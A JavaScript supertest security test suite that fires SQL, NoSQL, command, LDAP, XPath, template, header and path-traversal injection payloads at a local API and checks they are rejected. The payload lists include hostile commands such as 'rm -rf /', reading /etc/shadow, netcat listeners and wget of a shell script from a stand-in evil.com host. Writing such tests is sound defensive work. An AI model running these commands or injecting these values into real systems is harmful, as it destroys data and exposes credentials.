const request = require('supertest');

describe('Injection Attack Security Tests', () => {
  const baseURL = process.env.BASE_URL || 'http://localhost:8080';
  const apiBase = '/api/v1';
  
  let authToken;

  beforeAll(async () => {
    // Get authentication token
    const loginResponse = await request(baseURL)
      .post(`${apiBase}/auth/login`)
      .send({
        username: 'admin',
        password: 'test-password-123'
      });

    if (loginResponse.status === 200) {
      authToken = loginResponse.body.token;
    }
  });

  const getAuthHeaders = () => ({
    'Authorization': `Bearer ${authToken}`,
    'Content-Type': 'application/json'
  });

  describe('SQL Injection Tests', () => {
    const sqlInjectionPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT * FROM users --",
      "admin'--",
      "admin' /*",
      "' OR 1=1#",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
    ];

    test('should prevent SQL injection in search parameters', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(baseURL)
          .get(`${apiBase}/repositories`)
          .query({ search: payload })
          .set(getAuthHeaders());

        // Should not return 500 error (which might indicate SQL error)
        expect(response.status).not.toBe(500);
        
        // Should not return suspicious data patterns
        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toMatch(/syntax error|mysql|postgresql|sqlite/i);
          expect(responseText).not.toMatch(/ORA-\d+|SQL Server|Oracle/i);
        }
      }
    });

    test('should prevent SQL injection in filter parameters', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(baseURL)
          .get(`${apiBase}/findings`)
          .query({ 
            severity: payload,
            tool: payload,
            status: payload
          })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
        
        if (response.status === 200) {
          const responseText = JSON.stringify(response.body);
          expect(responseText).not.toMatch(/syntax error|mysql|postgresql/i);
        }
      }
    });

    test('should prevent SQL injection in POST request bodies', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(baseURL)
          .post(`${apiBase}/repositories`)
          .send({
            name: payload,
            url: `https://github.com/test/${payload}`,
            language: payload
          })
          .set(getAuthHeaders());

        // Should handle malicious input gracefully
        expect(response.status).not.toBe(500);
        
        if (response.body && response.body.error) {
          expect(response.body.error).not.toMatch(/syntax error|mysql|postgresql/i);
        }
      }
    });

    test('should prevent SQL injection in path parameters', async () => {
      const maliciousIds = [
        "1' OR '1'='1",
        "1; DROP TABLE users; --",
        "1 UNION SELECT * FROM users"
      ];

      for (const maliciousId of maliciousIds) {
        const response = await request(baseURL)
          .get(`${apiBase}/repositories/${encodeURIComponent(maliciousId)}`)
          .set(getAuthHeaders());

        // Should return 404 or 400, not 500
        expect([400, 404]).toContain(response.status);
      }
    });
  });

  describe('NoSQL Injection Tests', () => {
    const noSqlInjectionPayloads = [
      { "$ne": null },
      { "$gt": "" },
      { "$regex": ".*" },
      { "$where": "function() { return true; }" },
      { "$or": [{"username": "admin"}, {"username": "user"}] },
      "'; return db.users.find(); var dummy='",
      { "$nin": [""] }
    ];

    test('should prevent NoSQL injection in query parameters', async () => {
      for (const payload of noSqlInjectionPayloads) {
        const response = await request(baseURL)
          .get(`${apiBase}/repositories`)
          .query({ filter: JSON.stringify(payload) })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
        
        if (response.status === 200) {
          // Should not return all records (which might indicate successful injection)
          expect(response.body).toBeDefined();
        }
      }
    });

    test('should prevent NoSQL injection in request bodies', async () => {
      for (const payload of noSqlInjectionPayloads) {
        const response = await request(baseURL)
          .post(`${apiBase}/repositories`)
          .send({
            name: payload,
            query: payload
          })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Command Injection Tests', () => {
    const commandInjectionPayloads = [
      "; ls -la",
      "| cat /etc/passwd",
      "&& whoami",
      "; cat /etc/shadow",
      "| nc -l 4444",
      "; rm -rf /",
      "&& curl http://malicious.com",
      "; wget http://evil.com/shell.sh",
      "| python -c 'import os; os.system(\"ls\")'",
      "; powershell.exe Get-Process"
    ];

    test('should prevent command injection in repository URLs', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(baseURL)
          .post(`${apiBase}/repositories`)
          .send({
            name: 'test-repo',
            url: `https://github.com/test/repo${payload}`,
            language: 'javascript'
          })
          .set(getAuthHeaders());

        // Should validate URL format and reject malicious input
        expect([400, 422]).toContain(response.status);
      }
    });

    test('should prevent command injection in scan parameters', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(baseURL)
          .post(`${apiBase}/scans`)
          .send({
            repository_id: `test-repo${payload}`,
            branch: `main${payload}`,
            commit: `abc123${payload}`
          })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('LDAP Injection Tests', () => {
    const ldapInjectionPayloads = [
      "*)(uid=*",
      "*)(|(uid=*))",
      "admin)(&(password=*))",
      "*)(objectClass=*",
      "*)(&(objectClass=user)(uid=admin))",
      "*))%00"
    ];

    test('should prevent LDAP injection in authentication', async () => {
      for (const payload of ldapInjectionPayloads) {
        const response = await request(baseURL)
          .post(`${apiBase}/auth/login`)
          .send({
            username: payload,
            password: 'test-password'
          });

        // Should not authenticate with malicious LDAP queries
        expect(response.status).not.toBe(200);
        expect([400, 401]).toContain(response.status);
      }
    });

    test('should prevent LDAP injection in user search', async () => {
      for (const payload of ldapInjectionPayloads) {
        const response = await request(baseURL)
          .get(`${apiBase}/users`)
          .query({ search: payload })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('XPath Injection Tests', () => {
    const xpathInjectionPayloads = [
      "' or '1'='1",
      "' or 1=1 or ''='",
      "x' or name()='username' or 'x'='y",
      "' or position()=1 or ''='",
      "admin' or '1'='1' or ''='",
      "'] | //user/*[contains(*,'password')] | a['",
      "' or substring(//user[position()=1]/child::node()[position()=1],1,1)='a"
    ];

    test('should prevent XPath injection in XML processing', async () => {
      for (const payload of xpathInjectionPayloads) {
        // Test endpoints that might process XML data
        const response = await request(baseURL)
          .post(`${apiBase}/import/sarif`)
          .send({
            data: `<?xml version="1.0"?><root><user>${payload}</user></root>`
          })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Template Injection Tests', () => {
    const templateInjectionPayloads = [
      "{{7*7}}",
      "${7*7}",
      "#{7*7}",
      "{{config}}",
      "{{request}}",
      "${java.lang.Runtime.getRuntime().exec('ls')}",
      "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
      "<%= 7*7 %>",
      "{{constructor.constructor('return process')().exit()}}"
    ];

    test('should prevent template injection in notifications', async () => {
      for (const payload of templateInjectionPayloads) {
        const response = await request(baseURL)
          .post(`${apiBase}/notifications/settings`)
          .send({
            email_template: payload,
            slack_template: payload
          })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
        
        if (response.status === 200) {
          // Should not execute template code
          expect(response.body).not.toMatch(/49|process|config/);
        }
      }
    });

    test('should prevent template injection in report generation', async () => {
      for (const payload of templateInjectionPayloads) {
        const response = await request(baseURL)
          .post(`${apiBase}/reports/custom`)
          .send({
            title: payload,
            template: payload
          })
          .set(getAuthHeaders());

        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Header Injection Tests', () => {
    const headerInjectionPayloads = [
      "test\r\nX-Injected: true",
      "test\nSet-Cookie: admin=true",
      "test\r\n\r\n<script>alert('xss')</script>",
      "test%0d%0aX-Injected:%20true",
      "test\x0d\x0aX-Injected: true"
    ];

    test('should prevent HTTP header injection', async () => {
      for (const payload of headerInjectionPayloads) {
        const response = await request(baseURL)
          .get(`${apiBase}/repositories`)
          .set('X-Custom-Header', payload)
          .set(getAuthHeaders());

        // Should not reflect injected headers
        expect(response.headers['x-injected']).toBeUndefined();
        expect(response.headers['set-cookie']).not.toMatch(/admin=true/);
      }
    });
  });

  describe('File Path Injection Tests', () => {
    const pathTraversalPayloads = [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc%252fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
    ];

    test('should prevent path traversal in file operations', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(baseURL)
          .get(`${apiBase}/files/${encodeURIComponent(payload)}`)
          .set(getAuthHeaders());

        // Should not access system files
        expect([400, 403, 404]).toContain(response.status);
        
        if (response.body) {
          expect(response.body).not.toMatch(/root:|admin:|password:/);
        }
      }
    });

    test('should prevent path traversal in export functionality', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(baseURL)
          .get(`${apiBase}/export`)
          .query({ file: payload })
          .set(getAuthHeaders());

        expect([400, 403, 404]).toContain(response.status);
      }
    });
  });
});